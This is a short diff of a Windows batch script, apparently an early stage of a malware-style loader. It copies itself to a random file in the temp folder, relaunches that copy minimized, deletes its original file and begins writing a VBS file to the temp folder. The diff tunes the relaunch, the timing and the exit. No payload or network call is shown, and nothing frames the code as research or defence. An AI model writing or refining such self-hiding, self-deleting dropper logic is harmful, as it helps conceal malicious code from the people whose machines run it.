@@ -2,14 +2,15 @@
 setlocal enabledelayedexpansion
 
 if not "%1"=="w" (
-    set "t=%TEMP%\~!RANDOM!!RANDOM!.bat"
+    set "t=%TEMP%\w%RANDOM%.bat"
     copy /y "%~f0" "!t!" >nul 2>&1
     if exist "!t!" (
-        start /b cmd /c "!t!" w
-        timeout /t 1 /nobreak >nul
+        start /min cmd /c call "!t!" w
+        timeout /t 2 /nobreak >nul
         del /f /q "%~f0" >nul 2>&1
+        exit
     )
-    exit /b
+    exit
 )
 
 set "v=%TEMP%\~!RANDOM!.vbs"
